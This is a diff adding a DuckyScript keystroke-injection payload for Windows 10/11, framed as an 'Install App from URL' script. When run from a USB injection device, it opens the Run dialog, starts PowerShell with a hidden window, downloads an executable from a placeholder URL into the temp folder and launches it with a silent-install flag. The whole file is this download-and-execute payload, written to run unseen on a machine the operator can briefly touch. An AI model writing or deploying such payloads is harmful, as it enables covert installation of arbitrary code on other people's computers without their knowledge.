@@ -1,0 +1,17 @@
+REM =====================================================
+REM Title: Install App from URL
+REM Author: yogeshjoga
+REM Target: Windows 10/11
+REM Category: URL-Based Application Installation
+REM Description: Downloads and installs application from URL
+REM IMPORTANT: Replace YOUR_URL with actual download URL
+REM =====================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $url='YOUR_URL'; $output='$env:TEMP\installer.exe'; (New-Object System.Net.WebClient).DownloadFile($url, $output); Start-Process $output -ArgumentList '/S'; exit
+ENTER
